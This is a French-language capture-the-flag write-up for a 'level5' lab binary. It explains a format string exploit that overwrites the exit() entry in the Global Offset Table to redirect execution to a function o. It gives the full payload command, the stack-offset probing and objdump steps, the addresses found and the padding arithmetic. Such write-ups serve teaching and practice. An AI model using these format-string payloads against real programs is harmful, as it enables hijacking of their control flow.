**Exploit**: GOT Overwrite

**Commande**:  
```bash
python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"' > /tmp/exploit5  
```

**Explication**:  

Dans cet exploit, nous utilisons une vulnérabilité de chaîne de format pour écraser une entrée spécifique dans la Global Offset Table (GOT) du programme. L'objectif est de rediriger les appels à la fonction exit vers notre fonction cible o. Pour ce faire, nous construisons une chaîne de format qui, lorsqu'elle est traitée par printf, écrira l'adresse de la fonction o à l'emplacement de la GOT destiné à la fonction exit.
De maniere simple, la GOT est essentielle pour aider un programme à utiliser des fonctions qui ne sont pas incluses directement dans le programme lui-même, mais qui sont plutôt fournies par des bibliothèques partagées, comme la bibliothèque standard C (libc).

**Étapes**:  

- Pour comprendre où les données entrées apparaissent dans la pile lors de l'exécution de printf, exécuter une commande de test qui affiche les adresses sur la pile :
    python -c 'print "AAAA" + " %p" * 20' - | ./level5
    AAAA se trouve à la position 4 sur la pile 
- Exécuter objdump -R level5 pour afficher les entrées de relocalisation, incluant les adresses des fonctions de la libc utilisées par le programme, cela permet de trouver l'adresse d'exit()
- Utiliser objdump -t level5 | grep " o" pour trouver l'adresse de la fonction locale o dans le programme.
- Adresses identifiées:
    Fonction o : 080484a4
    Fonction exit : 08049838
- Pour pouvoir écraser l'adresse d'exit dans la GOT avec celle de notre fonction o, on doit convertir 080484a4 en décimal : 134513828
- Ensuite on soustrait les 4 octets de l'adresse d'exit à 134513828 ce qui nous donne 134513824
- Payload final : \x38\x98\x04\x08" + "%134513824c" + "%4$n"

**Ressources**:  

- [Exploit 101: Format Strings - Axcheron](https://axcheron.github.io/exploit-101-format-strings/)